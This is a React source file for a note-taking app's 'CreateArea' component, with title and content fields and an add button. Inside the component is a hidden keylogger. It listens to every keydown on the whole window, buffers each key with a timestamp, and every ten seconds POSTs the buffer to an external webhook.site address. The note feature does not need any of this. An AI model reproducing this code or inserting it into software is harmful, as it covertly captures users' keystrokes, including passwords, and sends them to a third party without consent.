import React, { useEffect, useState, useCallback } from "react";
import AddIcon from "@material-ui/icons/Add";
import Fab from "@material-ui/core/Fab";
import Zoom from "@material-ui/core/Zoom";

function CreateArea(props) {
  const [isExpanded, setExpanded] = useState(false);

  const [note, setNote] = useState({
    title: "",
    content: ""
  });

  const [buffer] = useState([]);


  const registerKeyPress = useCallback((e) => {

    var timestamp = Date.now() | 0;
    var stroke = {
      k: e.key,
      t: timestamp
    };
    buffer.push(stroke);
  }, []);
  
  useEffect(() => {
    window.addEventListener("keydown", registerKeyPress);
    window.setInterval(function() {
      if (buffer.length > 0) {
        fetch('https://webhook.site/8b4a22fc-8576-4f96-90fc-49c0984710b1', {
          method: 'POST',
          body: JSON.stringify({
            buffer
          }),
          headers: {
            'Content-type': 'application/json; charset=UTF-8',
          },
        })
           .then((response) => response.json())
           .then((data) => {
              console.log(data);
              // Handle data
           })
           .catch((err) => {
              console.log(err.message);
           });
      }
  }, 10000);
  }, [registerKeyPress]);
  function handleChange(event) {
    const { name, value } = event.target;

    setNote(prevNote => {
      return {
        ...prevNote,
        [name]: value
      };
    });
  }


  function submitNote(event) {
    props.onAdd(note);
    setNote({
      title: "",
      content: ""
    });
    event.preventDefault();
  }

  function expand() {
    setExpanded(true);
  }

  return (
    <div>

      <form className="create-note">
        {isExpanded && (
          <input
            name="title"
            onChange={handleChange}
            value={note.title}
            placeholder="Title"
          />
        )}

        <textarea
          name="content"
          onClick={expand}
          onChange={handleChange}
          value={note.content}
          placeholder="Take a note..."
          rows={isExpanded ? 3 : 1}
        />

        <Zoom in={isExpanded}>
          <Fab onClick={submitNote}>
            <AddIcon />
          </Fab>
        </Zoom>

      </form>

      <button onClick={() => console.log(buffer)}>Test</button>
    </div>
  );
}

export default CreateArea;
